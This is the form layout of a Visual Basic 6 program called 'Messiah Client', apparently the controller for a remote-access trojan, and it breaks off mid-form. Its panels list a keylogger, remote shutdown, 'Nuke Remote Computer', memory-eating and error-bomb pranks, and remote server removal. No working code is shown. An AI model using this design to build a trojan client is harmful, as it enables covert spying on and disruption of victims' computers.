VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "RICHTX32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "Messiah Client"
   ClientHeight    =   6360
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   7095
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form1.frx":08CA
   ScaleHeight     =   6360
   ScaleWidth      =   7095
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Matrix 
      Enabled         =   0   'False
      Interval        =   200
      Left            =   4920
      Top             =   5880
   End
   Begin MSComDlg.CommonDialog CD 
      Left            =   2400
      Top             =   5280
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   120
      Top             =   120
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   28
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":93E78
            Key             =   "a"
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":93FD4
            Key             =   "about"
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":94570
            Key             =   "destruct"
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":94B0C
            Key             =   "ft"
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":950A8
            Key             =   "sc"
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":95644
            Key             =   "ma"
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":957A0
            Key             =   "DES"
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":9607C
            Key             =   "chat"
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":96618
            Key             =   "mfun"
         EndProperty
         BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":96BB4
            Key             =   "inet"
         EndProperty
         BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":97150
            Key             =   "bat"
         EndProperty
         BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":976EC
            Key             =   "b"
         EndProperty
         BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":97848
            Key             =   "c"
         EndProperty
         BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":979A4
            Key             =   "d"
         EndProperty
         BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":97B00
            Key             =   "e"
         EndProperty
         BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":97C5C
            Key             =   "f"
         EndProperty
         BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":97DB8
            Key             =   "g"
         EndProperty
         BeginProperty ListImage18 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":97F14
            Key             =   "h"
         EndProperty
         BeginProperty ListImage19 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":984B0
            Key             =   "i"
         EndProperty
         BeginProperty ListImage20 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":9860C
            Key             =   "j"
         EndProperty
         BeginProperty ListImage21 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":98768
            Key             =   "k"
         EndProperty
         BeginProperty ListImage22 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":988C4
            Key             =   "l"
         EndProperty
         BeginProperty ListImage23 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":98A20
            Key             =   "m"
         EndProperty
         BeginProperty ListImage24 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":98B7C
            Key             =   "n"
         EndProperty
         BeginProperty ListImage25 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":98CD8
            Key             =   "o"
         EndProperty
         BeginProperty ListImage26 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":99274
            Key             =   "p"
         EndProperty
         BeginProperty ListImage27 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":99810
            Key             =   "q"
         EndProperty
         BeginProperty ListImage28 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":99DAC
            Key             =   "r"
         EndProperty
      EndProperty
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   240
      Top             =   600
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   5400
      Top             =   5880
   End
   Begin MSComctlLib.TreeView TreeView1 
      Height          =   4575
      Left            =   120
      TabIndex        =   81
      Top             =   1200
      Width           =   2055
      _ExtentX        =   3625
      _ExtentY        =   8070
      _Version        =   393217
      HideSelection   =   0   'False
      Indentation     =   18
      LabelEdit       =   1
      LineStyle       =   1
      Style           =   1
      ImageList       =   "ImageList1"
      Appearance      =   1
   End
   Begin VB.Frame Frame16 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2520
      TabIndex        =   141
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.CommandButton Command95 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Example"
         Height          =   375
         Left            =   120
         Style           =   1  'Graphical
         TabIndex        =   155
         Top             =   4080
         Width           =   975
      End
      Begin RichTextLib.RichTextBox Text16 
         Height          =   3495
         Left            =   120
         TabIndex        =   154
         Top             =   480
         Width           =   4215
         _ExtentX        =   7435
         _ExtentY        =   6165
         _Version        =   393217
         Enabled         =   -1  'True
         TextRTF         =   $"Form1.frx":9A454
      End
      Begin VB.CommandButton Command94 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Load"
         Height          =   375
         Left            =   1200
         Style           =   1  'Graphical
         TabIndex        =   153
         Top             =   4080
         Width           =   975
      End
      Begin VB.CommandButton Command93 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Save"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   152
         Top             =   4080
         Width           =   975
      End
      Begin VB.CommandButton Command88 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Run"
         Height          =   375
         Left            =   3360
         Style           =   1  'Graphical
         TabIndex        =   142
         Top             =   4080
         Width           =   975
      End
      Begin VB.Label Label22 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Batch File Creation."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1320
         TabIndex        =   143
         Top             =   120
         Width           =   1815
      End
   End
   Begin VB.Frame Frame15 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2520
      TabIndex        =   136
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.TextBox Text15 
         Height          =   285
         Left            =   0
         ScrollBars      =   2  'Vertical
         TabIndex        =   138
         Top             =   480
         Width           =   4335
      End
      Begin VB.CommandButton Command87 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Send"
         Height          =   375
         Left            =   3240
         Style           =   1  'Graphical
         TabIndex        =   137
         Top             =   840
         Width           =   1095
      End
      Begin VB.Label Label20 
         BackColor       =   &H00000000&
         Caption         =   $"Form1.frx":9A521
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   975
         Left            =   0
         TabIndex        =   140
         Top             =   1440
         Width           =   4335
      End
      Begin VB.Label Label19 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Re-Direct Dos."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1320
         TabIndex        =   139
         Top             =   120
         Width           =   1215
      End
   End
   Begin VB.Frame Frame14 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2520
      TabIndex        =   129
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.CommandButton Command86 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Clear"
         Height          =   375
         Left            =   3240
         Style           =   1  'Graphical
         TabIndex        =   135
         Top             =   3960
         Width           =   1095
      End
      Begin VB.CommandButton Command85 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Save"
         Height          =   375
         Left            =   2160
         Style           =   1  'Graphical
         TabIndex        =   134
         Top             =   3960
         Width           =   1095
      End
      Begin VB.TextBox Text14 
         Height          =   3375
         Left            =   0
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   133
         Top             =   480
         Width           =   4455
      End
      Begin VB.CommandButton Command84 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Disable"
         Height          =   375
         Left            =   1080
         Style           =   1  'Graphical
         TabIndex        =   132
         Top             =   3960
         Width           =   1095
      End
      Begin VB.CommandButton Command83 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Enable"
         Height          =   375
         Left            =   0
         Style           =   1  'Graphical
         TabIndex        =   130
         Top             =   3960
         Width           =   1095
      End
      Begin VB.Label Label18 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Keylogger."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1080
         TabIndex        =   131
         Top             =   120
         Width           =   2295
      End
   End
   Begin VB.Frame Frame13 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2520
      TabIndex        =   111
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.CommandButton Command82 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Taskmanager"
         Height          =   375
         Left            =   2400
         Style           =   1  'Graphical
         TabIndex        =   128
         Top             =   3960
         Width           =   1335
      End
      Begin VB.CommandButton Command81 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Freecell"
         Height          =   375
         Left            =   2400
         Style           =   1  'Graphical
         TabIndex        =   127
         Top             =   3480
         Width           =   1335
      End
      Begin VB.CommandButton Command80 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Scan Disk"
         Height          =   375
         Left            =   2400
         Style           =   1  'Graphical
         TabIndex        =   126
         Top             =   3000
         Width           =   1335
      End
      Begin VB.CommandButton Command79 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Disk Defrag"
         Height          =   375
         Left            =   2400
         Style           =   1  'Graphical
         TabIndex        =   125
         Top             =   2520
         Width           =   1335
      End
      Begin VB.CommandButton Command78 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Command"
         Height          =   375
         Left            =   2400
         Style           =   1  'Graphical
         TabIndex        =   124
         Top             =   2040
         Width           =   1335
      End
      Begin VB.CommandButton Command77 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Address book"
         Height          =   375
         Left            =   2400
         Style           =   1  'Graphical
         TabIndex        =   123
         Top             =   1560
         Width           =   1335
      End
      Begin VB.CommandButton Command76 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Explorer"
         Height          =   375
         Left            =   2400
         Style           =   1  'Graphical
         TabIndex        =   122
         Top             =   1080
         Width           =   1335
      End
      Begin VB.CommandButton Command75 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Internet Explorer"
         Height          =   375
         Left            =   2400
         Style           =   1  'Graphical
         TabIndex        =   121
         Top             =   600
         Width           =   1335
      End
      Begin VB.CommandButton Command74 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Solitaire"
         Height          =   375
         Left            =   960
         Style           =   1  'Graphical
         TabIndex        =   120
         Top             =   3960
         Width           =   1335
      End
      Begin VB.CommandButton Command73 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Calculator"
         Height          =   375
         Left            =   960
         Style           =   1  'Graphical
         TabIndex        =   119
         Top             =   3480
         Width           =   1335
      End
      Begin VB.CommandButton Command72 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Telnet"
         Height          =   375
         Left            =   960
         Style           =   1  'Graphical
         TabIndex        =   118
         Top             =   3000
         Width           =   1335
      End
      Begin VB.CommandButton Command71 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Regedit"
         Height          =   375
         Left            =   960
         Style           =   1  'Graphical
         TabIndex        =   117
         Top             =   2520
         Width           =   1335
      End
      Begin VB.CommandButton Command70 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Paint"
         Height          =   375
         Left            =   960
         Style           =   1  'Graphical
         TabIndex        =   116
         Top             =   2040
         Width           =   1335
      End
      Begin VB.CommandButton Command69 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Wordpad"
         Height          =   375
         Left            =   960
         Style           =   1  'Graphical
         TabIndex        =   114
         Top             =   1560
         Width           =   1335
      End
      Begin VB.CommandButton Command68 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Notepad"
         Height          =   375
         Left            =   960
         Style           =   1  'Graphical
         TabIndex        =   113
         Top             =   1080
         Width           =   1335
      End
      Begin VB.CommandButton Command64 
         BackColor       =   &H00FFFFFF&
         Caption         =   "MSN Messenger"
         Height          =   375
         Left            =   960
         Style           =   1  'Graphical
         TabIndex        =   112
         Top             =   600
         Width           =   1335
      End
      Begin VB.Label Label17 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Run Applications."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1560
         TabIndex        =   115
         Top             =   120
         Width           =   1575
      End
   End
   Begin VB.Frame Frame3 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   11
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.CommandButton Command8 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Shutdown"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   14
         Top             =   600
         Width           =   1335
      End
      Begin VB.CommandButton Command7 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Restart"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   13
         Top             =   1080
         Width           =   1335
      End
      Begin VB.CommandButton Command6 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Logoff"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   12
         Top             =   1560
         Width           =   1335
      End
      Begin VB.Label Label8 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Boot Options."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1680
         TabIndex        =   15
         Top             =   120
         Width           =   1575
      End
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   6
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.CommandButton Command5 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Remove Server"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   10
         Top             =   1560
         Width           =   1335
      End
      Begin VB.CommandButton Command4 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Close Server"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   9
         Top             =   1080
         Width           =   1335
      End
      Begin VB.CommandButton Command3 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Restart Server"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   8
         Top             =   600
         Width           =   1335
      End
      Begin VB.Label Label9 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Server Options."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1680
         TabIndex        =   7
         Top             =   120
         Width           =   1575
      End
   End
   Begin VB.Frame Frame22 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   201
      Top             =   1200
      Visible         =   0   'False
      Width           =   4575
      Begin VB.TextBox Text22 
         Height          =   285
         Left            =   3000
         TabIndex        =   208
         Text            =   "0"
         Top             =   240
         Visible         =   0   'False
         Width           =   495
      End
      Begin VB.TextBox Text2 
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000C000&
         Height          =   3495
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   207
         Text            =   "Form1.frx":9A5DC
         Top             =   480
         Width           =   4335
      End
      Begin VB.CommandButton Command126 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Enable"
         Height          =   375
         Left            =   120
         Style           =   1  'Graphical
         TabIndex        =   206
         Top             =   4080
         Width           =   975
      End
      Begin VB.CommandButton Command125 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Disable"
         Height          =   375
         Left            =   1200
         Style           =   1  'Graphical
         TabIndex        =   205
         Top             =   4080
         Width           =   975
      End
      Begin VB.CommandButton Command124 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Clear"
         Height          =   375
         Left            =   3480
         Style           =   1  'Graphical
         TabIndex        =   204
         Top             =   4080
         Width           =   975
      End
      Begin VB.CommandButton Command123 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Send"
         Height          =   375
         Left            =   2400
         Style           =   1  'Graphical
         TabIndex        =   202
         Top             =   4080
         Width           =   975
      End
      Begin VB.Label Label34 
         BackColor       =   &H00000000&
         Caption         =   "Matrix Emulator"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1320
         TabIndex        =   203
         Top             =   240
         Width           =   1335
      End
   End
   Begin VB.Frame Frame21 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   196
      Top             =   1200
      Visible         =   0   'False
      Width           =   4575
      Begin VB.CommandButton Command122 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Nuke Remote Computer"
         Height          =   375
         Left            =   960
         Style           =   1  'Graphical
         TabIndex        =   197
         Top             =   720
         Width           =   2175
      End
      Begin VB.Label Label31 
         BackColor       =   &H00000000&
         Caption         =   $"Form1.frx":9A5F4
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   1215
         Left            =   240
         TabIndex        =   200
         Top             =   1920
         Width           =   4095
      End
      Begin VB.Label Label30 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "!   WARNING   !"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   600
         TabIndex        =   199
         Top             =   1560
         Width           =   3135
      End
      Begin VB.Label Label29 
         BackColor       =   &H00000000&
         Caption         =   "Nuke Remote Computer."
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1080
         TabIndex        =   198
         Top             =   240
         Width           =   2175
      End
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   2
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.CommandButton Command127 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Ping"
         Height          =   375
         Left            =   1440
         MaskColor       =   &H00FFFFFF&
         Style           =   1  'Graphical
         TabIndex        =   215
         Top             =   1560
         UseMaskColor    =   -1  'True
         Width           =   2055
      End
      Begin MSWinsockLib.Winsock Winsock1 
         Left            =   600
         Top             =   4080
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin VB.CommandButton Command2 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Disconnect"
         Height          =   375
         Left            =   1440
         MaskColor       =   &H00FFFFFF&
         Style           =   1  'Graphical
         TabIndex        =   5
         Top             =   1080
         UseMaskColor    =   -1  'True
         Width           =   2055
      End
      Begin VB.CommandButton Command1 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Connect"
         Height          =   375
         Left            =   1440
         MaskColor       =   &H00FFFFFF&
         Style           =   1  'Graphical
         TabIndex        =   4
         Top             =   600
         UseMaskColor    =   -1  'True
         Width           =   2055
      End
      Begin VB.TextBox Text1 
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   345
         Left            =   120
         TabIndex        =   3
         Text            =   "<Enter IP Address>"
         Top             =   120
         Width           =   4335
      End
      Begin VB.Line Line3 
         BorderColor     =   &H00FFFFFF&
         BorderWidth     =   2
         X1              =   120
         X2              =   4440
         Y1              =   4440
         Y2              =   4440
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         BorderWidth     =   2
         X1              =   120
         X2              =   4440
         Y1              =   2400
         Y2              =   2400
      End
      Begin VB.Label Label28 
         BackColor       =   &H00000000&
         Caption         =   $"Form1.frx":9A6D1
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   1815
         Left            =   120
         TabIndex        =   195
         Top             =   2520
         Width           =   4335
      End
   End
   Begin VB.Frame Frame5 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   33
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.CommandButton Command25 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Eat Memory"
         Height          =   375
         Left            =   240
         Style           =   1  'Graphical
         TabIndex        =   216
         Top             =   2880
         Width           =   1935
      End
      Begin VB.CommandButton Command26 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Show Icons"
         Height          =   375
         Left            =   2400
         Style           =   1  'Graphical
         TabIndex        =   43
         Top             =   1920
         Width           =   1935
      End
      Begin VB.CommandButton Command27 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Hide Icons"
         Height          =   375
         Left            =   240
         Style           =   1  'Graphical
         TabIndex        =   42
         Top             =   1920
         Width           =   1935
      End
      Begin VB.CommandButton Command28 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Stop Reycle Loop"
         Height          =   375
         Left            =   2400
         Style           =   1  'Graphical
         TabIndex        =   41
         Top             =   1440
         Width           =   1935
      End
      Begin VB.CommandButton Command29 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Empty Recycle bin Loop"
         Height          =   375
         Left            =   240
         Style           =   1  'Graphical
         TabIndex        =   40
         Top             =   1440
         Width           =   1935
      End
      Begin VB.CommandButton Command30 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Stop beeping"
         Height          =   375
         Left            =   2400
         Style           =   1  'Graphical
         TabIndex        =   39
         Top             =   960
         Width           =   1935
      End
      Begin VB.CommandButton Command31 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Beep Computer"
         Height          =   375
         Left            =   240
         Style           =   1  'Graphical
         TabIndex        =   38
         Top             =   960
         Width           =   1935
      End
      Begin VB.CommandButton Command32 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Application Bomb"
         Height          =   375
         Left            =   2400
         Style           =   1  'Graphical
         TabIndex        =   37
         Top             =   480
         Width           =   1935
      End
      Begin VB.CommandButton Command33 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Error Bomb"
         Height          =   375
         Left            =   240
         Style           =   1  'Graphical
         TabIndex        =   36
         Top             =   480
         Width           =   1935
      End
      Begin VB.CommandButton Command35 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Open/Close CD Loop"
         Height          =   375
         Left            =   240
         Style           =   1  'Graphical
         TabIndex        =   35
         Top             =   2400
         Width           =   1935
      End
      Begin VB.CommandButton Command36 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Hide Active Windows"
         Height          =   375
         Left            =   2400
         Style           =   1  'Graphical
         TabIndex        =   34
         Top             =   2400
         Width           =   1935
      End
      Begin VB.Label Label12 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "More Fun."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1680
         TabIndex        =   44
         Top             =   120
         Width           =   1575
      End
   End
   Begin VB.Frame Frame23 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   209
      Top             =   1200
      Visible         =   0   'False
      Width           =   4575
      Begin VB.PictureBox picScroll 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Comic Sans MS"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   3225
         Left            =   120
         ScaleHeight     =   3225
         ScaleWidth      =   4335
         TabIndex        =   210
         Top             =   240
         Width           =   4335
         Begin VB.TextBox txtScroll 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            BorderStyle     =   0  'None
            BeginProperty Font 
               Name            =   "Comic Sans MS"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   500
            Left            =   0
            Locked          =   -1  'True
            MousePointer    =   1  'Arrow
            MultiLine       =   -1  'True
            TabIndex        =   211
            TabStop         =   0   'False
            Text            =   "Form1.frx":9A861
            Top             =   3120
            Width           =   4335
         End
      End
      Begin VB.Timer Timer2 
         Enabled         =   0   'False
         Interval        =   60
         Left            =   120
         Top             =   0
      End
      Begin VB.Label Label35 
         BackColor       =   &H00000000&
         Caption         =   "Please Visit..."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
